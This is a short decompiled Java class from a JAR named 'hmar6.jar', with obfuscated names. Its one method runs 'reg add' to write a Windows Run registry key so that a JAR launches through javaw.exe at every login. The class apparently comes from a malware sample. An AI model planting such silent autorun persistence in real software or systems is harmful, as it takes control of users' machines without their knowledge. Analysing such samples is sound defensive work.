package b;

/* loaded from: hmar6.jar:b/e.class */
public final class e extends a {
    public e(String str, String str2, boolean z) {
        super(str, str2, z);
    }

    @Override // b.a
    public final void a() {
        Runtime.getRuntime().exec(new String[]{"reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "/v", this.f27b, "/t", "REG_SZ", "/d", this.f26a ? String.valueOf(String.valueOf(System.getProperty("java.home")) + "\\bin\\javaw.exe") + " -jar \"" + this.c + "\"" : this.c, "/f"});
    }
}
